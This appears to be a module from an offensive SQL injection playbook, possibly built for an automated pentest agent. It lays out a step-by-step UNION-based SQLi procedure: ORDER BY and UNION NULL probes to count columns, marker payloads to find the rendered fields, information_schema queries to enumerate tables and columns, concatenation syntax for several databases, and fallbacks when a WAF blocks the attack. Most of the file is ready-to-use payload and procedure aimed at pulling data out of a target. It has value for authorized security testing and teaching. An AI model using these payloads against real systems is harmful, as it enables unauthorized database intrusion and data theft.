# UNION-Based SQLi

## Prerequisites

- HIGH confidence from Phase 2 (injection confirmed)
- Query output is rendered in response (visible data)
- Error-based not viable or UNION preferred for bulk extraction

## Core Principle

Append a second SELECT to exfiltrate data directly in the response. Fast bulk extraction.

## Workflow

```
1. Find column count
2. Identify output positions
3. Extract data via those positions
```

## Step 1: Determine Column Count

**ORDER BY method (preferred):**
```
' ORDER BY 1-- -    → valid
' ORDER BY 2-- -    → valid
' ORDER BY 3-- -    → valid
' ORDER BY 4-- -    → error (column count = 3)
```

Binary search for efficiency: start at 10, halve/double.

**UNION NULL method (fallback):**
```
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -    → valid = 3 columns
```

**Max attempts:** 20 columns. If not found, UNION likely not viable.

## Step 2: Find Output Positions

Replace NULLs with markers to see which columns render:
```
' UNION SELECT 'aaa','bbb','ccc'-- -
```

Check response for 'aaa', 'bbb', 'ccc'. Note which positions appear.

**Type issues:** If strings fail, try integers:
```
' UNION SELECT 111,222,333-- -
```

Or use NULL for non-output columns:
```
' UNION SELECT NULL,'marker',NULL-- -
```

## Step 3: Extract Data

Once you have column count and output position, extract via subqueries:

**Extraction targets:**
1. **Version:** `@@version` (MySQL/MSSQL), `version()` (PostgreSQL)
2. **Database:** `database()` (MySQL), `DB_NAME()` (MSSQL), `current_database()` (PostgreSQL)
3. **Tables:** `SELECT table_name FROM information_schema.tables WHERE table_schema=database()`
4. **Columns:** `SELECT column_name FROM information_schema.columns WHERE table_name='x'`
5. **Data:** `SELECT CONCAT(col1,':',col2) FROM table`

**Template:**
```
' UNION SELECT NULL,[payload],NULL-- -
```

Replace `[payload]` with target. Adjust NULL count to match columns.

## Handling Single-Row Output

If only first row renders, paginate with `LIMIT 1 OFFSET N` or aggregate with `GROUP_CONCAT()` (MySQL).

## Column Type Matching

UNION requires matching types. Start with NULL (type-agnostic), then test string/int in each position if needed.

## String Concatenation by DB

```
MySQL:      CONCAT(a,b) or CONCAT_WS(':',a,b)
MSSQL:      a+':'+b
PostgreSQL: a||':'||b
Oracle:     a||':'||b
```

## Attempt Limits

- Column count: Max 20 ORDER BY attempts
- Position finding: Max 5 marker variations
- Schema enum: Max 50 tables, 20 columns per table
- Data extraction: As needed, monitor for rate limiting

## Common Failures

| Symptom | Cause | Fix |
|---------|-------|-----|
| Type mismatch error | Column types don't align | Use NULL, cast types |
| No output visible | Wrong output position | Test all positions with markers |
| Truncated output | Application limits length | Use SUBSTRING, paginate |
| WAF blocks UNION | Keyword filtering | See filter_bypass.md |

## Stop Conditions

- Column count >20 → likely not UNION-injectable
- All positions NULL/invisible → fall back to blind methods
- Consistent WAF blocks → pivot to blind or filter bypass
